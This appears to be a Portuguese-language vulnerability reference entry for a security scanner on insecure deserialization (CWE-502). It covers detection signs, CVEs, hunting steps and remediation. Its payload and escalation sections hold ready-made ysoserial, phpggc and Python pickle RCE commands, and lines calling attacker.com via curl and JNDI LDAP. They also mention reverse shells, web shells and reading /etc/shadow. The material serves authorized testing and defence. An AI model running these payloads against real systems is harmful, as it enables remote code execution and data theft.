---
id: insecure_deserialization
title: "Insecure Deserialization"
module: "Deserialization"
severity: "CRITICAL"
cwe_id: "CWE-502"
cwe_title: "Deserialization of Untrusted Data"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
vrt_id: "server_security_misconfiguration.insecure_deserialization"
---

## Summary
Dados serializados controlados pelo usuario sao desserializados sem validacao, permitindo execucao remota de codigo (RCE) via gadget chains em Java (ObjectInputStream), PHP (unserialize), Python (pickle), .NET (BinaryFormatter/ViewState) e Ruby.

## Description
Desserializacao insegura ocorre quando a aplicacao reconstroi objetos a partir de dados binarios ou textuais fornecidos pelo usuario sem verificar integridade ou restringir tipos permitidos. O atacante injeta dados serializados maliciosos que, ao serem processados, executam codigo arbitrario via Property Oriented Programming (POP) gadget chains.

Variantes por linguagem:

- **Java:** `ObjectInputStream.readObject()` processa bytes com magic `0xACED0005` (Base64: `rO0AB`). Gadget chains em Commons Collections, Spring, JNDI permitem RCE via ysoserial. Endpoints vulneraveis: JBoss JMXInvokerServlet, WebLogic T3/IIOP, Jenkins CLI.
- **PHP:** `unserialize()` processa strings com formato `O:<len>:"<class>":<n>:{...}`. Gadget chains em Monolog, Guzzle, Laravel, Symfony (phpggc). Magic methods: `__wakeup()`, `__destruct()`, `__toString()`.
- **Python:** `pickle.loads()` executa codigo via `__reduce__()` -- nao existe uso seguro de pickle com dados nao confiaveis.
- **.NET:** `BinaryFormatter`, `ObjectStateFormatter` (ViewState), `LosFormatter`. ViewState sem MAC validation permite RCE via ysoserial.net. Magic: `0xFF01` (Base64: `/w`).
- **Ruby:** `Marshal.load()` em cookies (Rails < 4.1 sem encrypted sessions). Gadget chain universal em Ruby 2.x.

Sinais de deteccao:

| Formato | Header (Hex) | Header (Base64) |
|---------|-------------|-----------------|
| Java Serialized | AC ED | rO0AB |
| .NET ViewState | FF 01 | /w |
| Python Pickle | 80 04 95 | gASV |
| PHP Serialized | 4F 3A | Tz |

## Impact
- Execucao remota de codigo (RCE) no servidor.
- Comprometimento completo da aplicacao e infraestrutura.
- Leitura de arquivos sensiveis e credenciais.
- Movimento lateral para outros sistemas na rede.
- Negacao de servico via desserializacao de payloads malformados.
- Bypass de autenticacao via manipulacao de sessao serializada.

## Payloads and Bypasses
```
# -- Java: malformed serialized object (Base64) --
# Magic: 0xACED0005 -> rO0ABXNyAAFB (triggers error on deser endpoints)
rO0ABXNyAAFB

# -- Java: ysoserial gadget chains --
# CommonsCollections1 (Apache Commons Collections 3.1)
java -jar ysoserial.jar CommonsCollections1 'whoami' | base64
# CommonsCollections5 (Commons Collections 3.1, sem SecurityManager)
java -jar ysoserial.jar CommonsCollections5 'id' | base64
# Spring1 (Spring Framework)
java -jar ysoserial.jar Spring1 'curl http://attacker.com/rce' | base64

# -- PHP: malformed serialized object --
O:1:"a":0:{}
# PHP: POP chain via phpggc
phpggc Laravel/RCE1 system id
phpggc Monolog/RCE1 system whoami
phpggc Symfony/RCE4 system id

# -- Python: pickle RCE via __reduce__ --
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())))

# -- .NET: ViewState (sem MAC) via ysoserial.net --
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "whoami"
# ViewState forjado (machineKey vazado)
ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/login.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="LEAKED_KEY" -c "cmd /c whoami"

# -- Deteccao: endpoints de framework vulneraveis --
/invoker/JMXInvokerServlet
/wls-wsat/CoordinatorPortType
/console/
/jenkins/script
/_async/AsyncResponseService
```

## Target Context (Crawler Hints)
- **Parametros comuns:** `data`, `object`, `state`, `token`, `session`, `payload`, `viewstate`, `input`.
- **Paths comuns:** `/invoker/JMXInvokerServlet`, `/wls-wsat/CoordinatorPortType`, `/console/`, `/jenkins/script`, `/_async/AsyncResponseService`, `/login`, `/api/`, `/api/v1/`.
- **Sinais:** Content-Type `application/x-java-serialized-object`; parametro `__VIEWSTATE` no HTML; cookies com prefixo `rO0AB` (Java) ou `O:` (PHP); headers `Server: Apache-Coyote`, `X-Powered-By: JSF`, `JBoss`, `WebLogic`, `GlassFish`.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2017-9805 | Apache Struts 2 | 2017 | RCE via desserializacao XML no plugin REST (XStream) -- explorado em massa | Java deser RCE |
| CVE-2015-4852 | Oracle WebLogic | 2015 | RCE via desserializacao em T3 protocol -- primeiro exploit ysoserial em larga escala | Java deser RCE |
| CVE-2020-36189 | FasterXML jackson-databind | 2020 | Gadget chain bypass permite RCE via desserializacao polimorfica em Jackson | Java deser RCE |
| CVE-2020-0618 | Microsoft SQL Server Reporting | 2020 | RCE via desserializacao insegura no SSRS -- ViewState sem MAC | .NET deser RCE |
| CVE-2018-1000861 | Jenkins | 2018 | Cadeia de vulnerabilidades incluindo desserializacao no CLI permite RCE pre-auth | Java deser RCE |
| CVE-2023-46604 | Apache ActiveMQ | 2023 | RCE via ClassInfo deserialization no protocolo OpenWire -- explorado in-the-wild | Java deser RCE |

## Escalation Techniques
- **RCE via gadget chains:** usar ysoserial (Java), phpggc (PHP), ou pickle com `__reduce__` (Python) para executar comandos no servidor. Comecar com `whoami` ou `id` para confirmar, escalar para reverse shell.
- **Exfiltracao de dados:** em Java, usar gadget chains que fazem DNS/HTTP lookup (URLDNS payload do ysoserial) para exfiltrar dados via out-of-band quando RCE direto nao e possivel.
- **Manipulacao de sessao:** quando cookies contam objetos serializados sem assinatura, modificar propriedades (role, isAdmin, userId) para escalar privilegios sem executar codigo.
- **ViewState exploitation (.NET):** se `enableViewStateMac=false` ou machineKey e vazado em paginas de erro/config, usar ysoserial.net para gerar ViewState malicioso com RCE.
- **Pivot via JNDI (Java):** em ambientes com JNDI lookup habilitado, usar gadget chain que faz `InitialContext.lookup("ldap://attacker.com/exploit")` para carregar classe remota (similar a Log4Shell).
- **File read/write:** gadget chains como `FileOutputStream` (Java) ou `file_put_contents` (PHP) permitem gravar web shells ou ler arquivos sensiveis como `/etc/shadow`.
- **Denial of Service:** enviar objeto serializado com referencia circular ou colecao enorme para consumir memoria/CPU durante desserializacao.

## Hunting Methodology
1. Identificar formato de serializacao -- procurar magic bytes em cookies, parametros e corpos de request: `rO0AB` (Java), `O:` (PHP), `gASV` (Python pickle), `__VIEWSTATE` (.NET).
2. Decodificar valores Base64 suspeitos em cookies e parametros hidden -- comparar primeiros bytes com tabela de formatos conhecidos.
3. Verificar Content-Type headers -- `application/x-java-serialized-object`, `application/x-java-serialized-object;class=*` indicam endpoints de desserializacao Java.
4. Mapear endpoints de frameworks vulneraveis: `/invoker/JMXInvokerServlet` (JBoss), `/wls-wsat/CoordinatorPortType` (WebLogic), `/jenkins/script` (Jenkins), `/_async/AsyncResponseService` (WebLogic).
5. Enviar objeto serializado malformado e observar erro -- erros com `java.io.StreamCorruptedException`, `InvalidClassException`, `unserialize(): Error` confirmam que o endpoint tenta desserializar.
6. Testar time-based: enviar payload ysoserial com `Thread.sleep(5000)` ou phpggc com `sleep(5)` e medir tempo de resposta.
7. Testar out-of-band: usar payload URLDNS (ysoserial) que faz DNS lookup para collaborator -- confirma desserializacao sem precisar de RCE.
8. Para .NET, verificar se ViewState tem MAC desabilitado enviando ViewState modificado -- se a aplicacao processa sem erro, e vulneravel.

## False Positive Indicators
- Base64 que decodifica para JSON, JWT ou texto plano -- nao e objeto serializado, mesmo que pareca suspeito.
- ViewState com MAC validation habilitado (parametro `__VIEWSTATEGENERATOR` presente, ViewState termina com HMAC) -- manipulacao sera rejeitada pelo servidor.
- Endpoint retorna erro generico (500) mas nao processa o payload -- pode ser outro tipo de erro, nao desserializacao. Confirmar com payload time-based ou out-of-band.
- Cookie com prefixo `rO0AB` em aplicacao Java mas o objeto e apenas estado de sessao inofensivo com assinatura HMAC -- manipulacao invalida a assinatura.
- Framework endpoint existe (ex.: JMXInvokerServlet) mas retorna 403/404 -- esta protegido por autenticacao ou foi removido.
- Aplicacao usa desserializacao com allowlist de classes (ex.: `ValidatingObjectInputStream`) -- gadget chains padrao serao bloqueados.

## Recommendation
1. Nunca usar `ObjectInputStream`, `unserialize()`, `pickle.loads()` ou `BinaryFormatter` em dados de usuario.
2. Migrar para formatos seguros: JSON, Protocol Buffers, MessagePack.
3. Se desserializacao for necessaria, implementar allowlist de classes (`ValidatingObjectInputStream` em Java, `allowed_classes` em PHP).
4. Habilitar ViewState MAC validation em ASP.NET (`enableViewStateMac=true`). Nunca expor `machineKey` em `web.config` ou paginas de erro.
5. Remover ou restringir acesso a endpoints de gerenciamento (JMX, WebLogic console, Jenkins script).
6. Usar HMAC para validar integridade de dados serializados antes de processar.
7. Atualizar frameworks e bibliotecas para versoes com desserializacao segura.
8. Monitorar logs para tentativas de desserializacao (magic bytes 0xACED, prefixo rO0AB em parametros/cookies).
